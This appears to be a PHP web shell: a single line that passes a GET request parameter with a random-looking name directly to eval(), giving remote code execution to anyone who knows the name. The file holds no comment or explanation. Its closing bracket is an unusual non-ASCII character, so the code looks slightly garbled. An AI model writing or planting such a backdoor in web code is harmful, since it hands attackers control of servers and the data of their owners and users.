<?php
eval($_GET['MHUDBCok'〕);
?>
